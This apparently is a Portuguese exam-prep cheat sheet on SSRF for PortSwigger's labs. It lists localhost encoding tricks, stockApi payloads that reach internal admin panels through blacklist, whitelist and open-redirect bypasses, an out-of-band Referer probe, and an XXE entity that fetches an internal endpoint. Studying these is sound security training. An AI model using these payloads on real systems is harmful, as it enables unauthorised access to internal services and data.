# SSRF - Server Side Request Forgery

Probabilidade: $${\color{yellow}média}$$.

Se você encontrar SSRF no exame, utilize para ler arquivos internos no endereço `localhost:6566`, como designado pela própria PortSwigger.

Algumas alternativas ao localhost e ao 127.0.0.1:
```
2130706433
017700000001
127.1
```

Alguns bypassess não ensinados nos laboratórios:
```
Type in http://2130706433 instead of http://127.0.0.1
️Hex Encoding 127.0.0.1 translates to 0x7f.0x0.0x0.0x1
Octal Encoding 127.0.0.1 translates to 0177.0.0.01
Mixed Encoding 127.0.0.1 translates to 0177.0.0.0x1

https://h.43z.one/ipconverter/
```

O lugar para procurar por SSRF normalmente é em `/product/stock` ou em parâmetros que envolvem URL.

<br>

## Laboratórios

**Basic SSRF Against Another Back-End System**
```
stockApi=http://192.168.0.34:8080/admin

stockApi=http://localhost/admin
```

<br>
<br>

**SSRF with Blacklist-Based Input Filter**

Um método:
```
stockApi=http://127.1/AdMiN/
```

Isso funciona:
```
http://127.1/
```

Mas isso não:
```
http://127.1/admin
```

Então precisar encodar a letra 'a' em URL duas vezes (outro método):
```
http://127.1/%25%36%31dmin
```

<br>
<br>

**SSRF with Filter Bypass via Open Redirection Vulnerability**
```
stockApi=/product/nextProduct?currentProductId=2%26path%3dhttp://192.168.0.12:8080/admin

# Encodado em URL
stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2f192.168.0.12%253a8080%2fadmin

# Ou na requisição GET
https://TARGET.net/product/nextProduct?currentProductId=1&path=http%3a//192.168.0.12%3a8080/admin
```

<br>
<br>

**Blind SSRF with Out-of-Band Detection**
```
Referer: http://burpcollaborator
```

<br>
<br>

**SSRF with Whitelist-Based Input Filter**
```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/

# Double URL Decoded
stockApi=http://localhost:80#@stock.weliketoshop.net/admin/
```

<br>
<br>

**Exploiting XXE to Perform SSRF Attacks**
```xml
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:6566/latest/"> ]>
  <stockCheck>
    <productId>
      &xxe;
    </productId>
    <storeId>
      1
    </storeId>
  </stockCheck> 
```

![image](https://github.com/user-attachments/assets/a36ba2d0-026a-4f43-8e3c-cba411eb11ce)
